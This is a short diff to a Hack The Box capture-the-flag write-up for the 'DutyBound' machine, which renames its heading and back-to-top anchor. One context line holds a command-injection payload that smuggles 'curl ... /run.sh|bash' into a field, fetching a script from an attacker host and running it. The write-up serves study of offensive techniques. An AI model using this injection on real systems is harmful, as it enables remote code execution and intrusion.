@@ -1,5 +1,9 @@
 ---
-# WriteUp_DotyBound (HTB) {#WriteUp_DotyBound}
+
+# WriteUp {#WriteUp}
+
+==DutyBound.htb==
+
 ---
 - [X]  **Discovered port and service with `nmap`**
 
@@ -173,4 +177,4 @@ true;curl -s http://10.10.X.X:8000/run.sh|bash;#,1,1
 
 </details>
 
-[Torna su](#WriteUp_DotyBound)
+[Torna su](#WriteUp)
